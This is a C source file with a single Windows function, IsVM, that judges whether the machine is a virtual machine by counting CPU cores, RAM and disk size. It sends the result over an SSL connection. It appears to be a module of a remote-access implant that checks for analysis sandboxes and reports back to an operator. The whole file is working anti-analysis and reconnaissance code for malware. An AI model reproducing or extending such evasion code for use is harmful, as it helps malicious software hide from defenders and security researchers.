#include "Variables.h"

int IsVM(SSL *ssl)
{
	char ProbableVM[196] = "";
	char NoVM[] = "\033[0;35m[+] No VM Detected.\033[0m\n";
	int VMIndicatorsArr[3] = {0, 0, 0};
	int VMIndicators = 0;

	SYSTEM_INFO SysInfo;
	MEMORYSTATUSEX MemStatus;
	MemStatus.dwLength = sizeof(MemStatus);
	GetSystemInfo(&SysInfo);
	long long RAM = 0;

	if (SysInfo.dwNumberOfProcessors < 4)
	{
		VMIndicatorsArr[0] = 1;
		VMIndicators++;
	}

	if (GlobalMemoryStatusEx(&MemStatus))
	{
		RAM = MemStatus.ullTotalPhys / (1024 * 1024);
	}

	if (RAM < 4000)
	{
		VMIndicatorsArr[1] = 1;
		VMIndicators++;
	}

	DWORD SectsPCluster = 0;
	DWORD BytesPSector = 0;
	DWORD NumOfFreeClusters = 0;
	DWORD TotalNumOfClusters = 0;
	GetDiskFreeSpaceA("C:\\", &SectsPCluster, &BytesPSector, &NumOfFreeClusters, &TotalNumOfClusters);

	double GBs = 1073741824.0;
	double TotalSpace = (SectsPCluster * BytesPSector * (double)TotalNumOfClusters) / GBs;

	if (TotalSpace < 60.0)
	{
		VMIndicatorsArr[2] = 1;
		VMIndicators++;
	}

	if (VMIndicators == 0)
	{
		SSL_write(ssl, NoVM, sizeof(NoVM));
		return EXIT_SUCCESS;
	}
	else if (VMIndicators > 0)
	{
		snprintf(ProbableVM, sizeof(ProbableVM), "[+] 0: No VM, 1: Probable VM. Cores < 4 / RAM < 4 GB / DiskSpace < 60 GB: %d/%d/%d\n", VMIndicatorsArr[0], VMIndicatorsArr[1], VMIndicatorsArr[2]);

		SSL_write(ssl, ProbableVM, sizeof(ProbableVM));
		return EXIT_SUCCESS;
	}
}
